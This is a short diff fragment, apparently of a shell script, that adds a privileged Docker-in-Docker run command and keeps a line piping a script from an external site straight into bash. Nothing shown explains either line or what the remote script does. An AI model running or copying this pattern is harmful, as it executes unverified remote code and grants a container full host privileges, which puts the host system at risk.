@@ -1,3 +1,6 @@
+docker run --privileged -d docker:dind
+
+ 
  bash <(curl -s https://codes.jishnu.fun)
 
  
